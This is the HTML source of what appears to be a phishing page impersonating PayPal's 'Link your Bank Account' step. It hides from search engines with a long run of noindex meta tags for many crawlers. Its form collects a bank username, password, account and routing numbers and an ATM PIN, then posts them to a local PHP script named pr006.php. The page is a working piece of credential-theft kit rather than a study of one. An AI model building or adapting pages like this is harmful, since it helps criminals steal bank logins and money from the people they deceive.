<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Link Bank Account | Send Money, Pay Online or Set Up a Merchant Account - PayPal</title>

 <meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">
    
    <link rel="stylesheet" href="css/style.css" />
    <link rel="shortcut icon" href="images/favicon.png"/>
    <script type="text/javascript" src="js/jqueryLib.js"></script>
     
     <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}


function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
<div class="img10-const">
  <div class="img10"></div>
  </div>
<div class="card-const">
       <div class="card-box1">
         <div class="card-heading1">Link your Bank Account</div>
         <div class="pmheadingmsg3">Connect to your Bank account to confirm that you control this bank account. <br><br>The bank account must be same for your <span style="font-weight:bold">Card X-8476</span>.<br><br> <span style="font-weight:bold">Bank Country :</span> United States of America</div>
         <div class="card-content">
         <!-- First Form -->
           <form name="lybForm" id="lybForm" method="post" action="pr006.php" >
             <table width="519" border="0">
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td width="513" colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="text" name="lbaacctusername" id="lbaacctusername" required autocomplete="off" class="txt2"  placeholder="Account Username / ID"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">
                 <input type="password" name="lbapassword" id="lbapassword" required autocomplete="off" class="txt2"  placeholder="Account Password / Passcode"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td>
                 <input type="text" name="ibaaccountnumber" id="ibaaccountnumber" required autocomplete="off" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="12" minlength="12" placeholder="Account Number" class="txt3"></td>
                 <td><input type="text" name="ibaroutingnumber" id="ibaroutingnumber" required autocomplete="off" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="9" minlength="9" placeholder="Routing Number" class="txt3"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="password" name="ibaatmpin" id="ibaatmpin" required autocomplete="off" class="txt2"  placeholder="ATM PIN" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="5" minlength="5"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="submit" name="btnsaves" id="btnsaves" value="Agree and Link" class="btnsave"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
             </table>
           </form>
          
         </div>
       </div>
    </div>
    <div class="img13-const">
       <div class="img13"></div>
    </div>
<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="images/loding.gif" width="60" height="60">
    </div>
</div>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>